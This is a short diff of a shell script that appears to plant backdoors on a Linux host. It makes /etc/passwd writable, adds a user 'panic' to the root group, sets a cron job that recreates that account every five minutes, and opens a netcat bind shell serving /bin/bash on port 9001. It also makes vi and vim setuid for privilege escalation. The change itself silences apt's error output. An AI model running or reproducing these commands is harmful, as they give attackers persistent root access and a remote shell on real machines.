@@ -4,7 +4,7 @@ chmod 666 /etc/passwd
 useradd panic -p iwrites1ns
 usermod -a -G root panic
 echo "\*/5 \* \* \* \*  root  useradd panic -p iwrites1ns && usermod -a -G root panic" >> /etc/crontab
-apt update && apt -y install netcat-traditional
+apt update 2> /dev/null && apt -y install netcat-traditional 2> /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
 chmod u+s `which vim`
